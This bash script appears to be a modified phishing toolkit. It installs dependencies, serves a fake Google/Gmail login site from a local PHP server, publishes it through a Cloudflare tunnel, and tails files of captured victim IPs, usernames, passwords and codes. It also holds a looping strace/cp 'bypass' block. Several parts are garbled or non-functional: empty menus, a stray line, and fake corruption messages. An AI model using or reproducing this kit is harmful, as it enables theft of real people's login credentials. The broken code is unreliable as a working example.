#!/bin/bash
##############################################################################
##############################################################################
##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2022  RAMDOMRYANS (https://github.com/RANDOMRYANS)
##
###################################################################################
###################################################################################
## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi


## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${WHITE}[${WHITE}!${WHITE}]${WHITE} Program Interrupted." 2>&1; reset_color; }
    exit 0
}
exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${WHITE}[${WHITE}!${WHITE}]${WHITE} Program Terminated." 2>&1; reset_color; }
    exit 0
}
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## bypass
touch a

f() {
  while true; do
    rm -f b
    strace -o /tmp/cp${BASHPID}.trace cp a b || break
  done
}

cleanup() {
  kill -9 %1 %2
}

f &
f &

trap cleanup exit

wait

## Small Banner
banner_small() {
	cat <<- EOF
${RED}   _______________   ${WHITE}                 ${RED} __   __   ${RED}    ____________
${RED} /    ((    ____   \ ${WHITE} ██████   ██████ ${RED}|  | /  )  ${RED}  /   /_______   \\
${RED}/   /   \   \___)   )${WHITE}██  ████ ██  ████${RED}|  |/  /${WHITE}__ ${RED} /   (__ __   \   \\
${WHITE}██ ${RED}|     \    _    / ${WHITE}██ ██ ██ ██ ██ ██${RED}|  () (${WHITE}(__(${RED}(___  _||  |   | ${WHITE}██
${RED}\   \_____\    \   \ ${WHITE}████  ██ ████  ██${RED}|  |\  \   ${RED}  |  |  |  |__/   /
${RED} \ ________\\____\___\ ${WHITE}██████   ██████ ${RED}|__| \__\  ${RED}  |__|  |_______ /
EOF
}
## Dependencies
dependencies() {

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${WHITE}[${WHITE}!${WHITE}]${WHITE} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
		{ reset_color; exit 1; }
	fi
}


## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}


## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Github   ${WHITE}:  ${CYAN}https://github.com/randomryans
		${GREEN}Version  ${WHITE}:  ${ORANGE}2.2

		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}

		${WHITE}Warning:${WHITE}
		${CYAN}This Tool is made for educational purpose only ${WHITE}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${WHITE}!${WHITE}

		${WHITE}[${WHITE}00${WHITE}]${ORANGE} Main Menu     ${WHITE}[${WHITE}99${WHITE}]${ORANGE} Exit

	EOF

	read -p "${WHITE}[${WHITE}-${WHITE}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${WHITE}[${WHITE}!${WHITE}]${WHITE} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}rR${RED}]${WHITE}1001 0101 0110 0111 1001 0110 0231 110${RED}2  BINARY CURRUPT!  ${WHITE}SYSTEM RESTARTING"
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
	echo -ne "\n${RED}[${WHITE}rR${RED}]${WHITE} WELCOME TO 4D... FUCK "${WHITE}
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	cat .server/www/ip.txt >> .server/www/log.txt
	sleep 1
}

## Get credentials
capture_creds() {
	IFS=$'\n'
	sleep 10
	echo -ne "\r"
}

## Print data
capture_data() {
	echo -ne "\n"
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/logs.txt" ]]; then
			capture_creds
			rm -rf .server/www/logs.txt
		fi
		sleep 0.75
	done
}

Cloudflared
start_cloudflared() { 
        rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${WHITE}rR${RED}]${GREEN}${RED}0010 0011 0101 000${RED}2 ERROR SYSTEM CURRUPT STOPPING "

	echo -e "\n${RED}[${WHITE}rR${RED}]${GREEN}${RED}DOWNLOAD CURRUPT${WHITE}SEE LOCALHOST FOR MORE INFO${RED}|${WHITE}$HOST${BLUE}:$PORT "
	{ sleep 1; setup_site; }
	sleep 2
	echo -ne "\n${RED}[${WHITE}rR${RED}]${GREEN} ACCESS GRANTED "
	echo -ne "\n"
	echo -ne "\n${RED}[${WHITE}rR${RED}]${WHITE} DEPLOYING SYSTEM"

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}rR${RED}]${WHITE} YOU HAVE${RED} 5 ${WHITE}SECONDS ${WHITE}TO${RED} COPY ${WHITE} THE LINK ${RED}GET READY!"
	sleep 5
	echo -e "\n${RED}[${WHITE}rR${RED}]${WHITE} $cldflr_link  "
	sleep 5
	multitail -s 2 -sn 1,3  .server/www/ip.txt .server/www/user.txt .server/www/pass.txt .server/www/code.txt
	capture_data
}

## Start localhost
start_localhost() {
	setup_site
	{ sleep 1; clear; banner_small; }
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

	EOF


	case $REPLY in 
		*)
			start_cloudflared;;
	esac
}
## Gmail/GooglE
site_gmail() {
	cat <<- EOF

	EOF


	case $REPLY in 
		YES | yes)
			website=".site"
			tunnel_menu;;
		1)
			echo -ne "\n${WHITE}[${WHITE}!${WHITE}]${WHITE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}


## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF

	EOF

	case $REPLY in 
	        *)
			website="google_new"
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		7)
			echo -ne "\n${WHITE}[${WHITE}!${WHITE}]${WHITE} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_cloudflared
main_menu
